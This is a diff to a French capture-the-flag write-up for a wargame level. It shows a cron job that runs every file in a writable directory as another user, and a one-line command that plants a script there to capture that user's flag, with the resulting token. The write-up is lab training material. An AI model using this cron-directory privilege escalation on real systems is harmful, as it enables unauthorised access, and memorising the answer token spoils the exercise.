@@ -12,9 +12,8 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 - On peut voir que le crontab execute tout les fichier se trouvant dans /opt/openarenaser/ en tant que flag05
-- Donc on crée un executable qui
-- `echo "getflag > /tmp/lol" > /opt/openarenaserver/run`
-- `cat /tmp/lol`
+- Donc on crée un script qui execute getflag
+- `echo "getflag > /tmp/flag" > /opt/openarenaserver/run; cat /tmp/flag`
 ```
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
